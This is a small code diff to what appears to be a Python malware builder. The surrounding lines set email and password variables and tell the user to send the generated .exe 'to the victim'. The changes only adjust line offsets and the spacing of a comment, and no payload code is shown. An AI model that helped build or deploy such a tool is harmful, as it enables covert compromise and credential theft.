@@ -32,8 +32,8 @@ error = "0"
 email = ""
 pwd = ""
 mailto = ""
-serverlineStart = 211
-serverlineStop = 319
+serverlineStart = 208
+serverlineStop = 316
 
 while loop:
     os.system("cls")
@@ -108,7 +108,7 @@ def done():
         )
     print(f"\nServer has been created as '{appname}'.exe")
     print(f"Remember: You send the '{appname}'.exe to the victim!")
-    #input("Press Enter to continue...")
+    # input("Press Enter to continue...")
     exit()
 
 
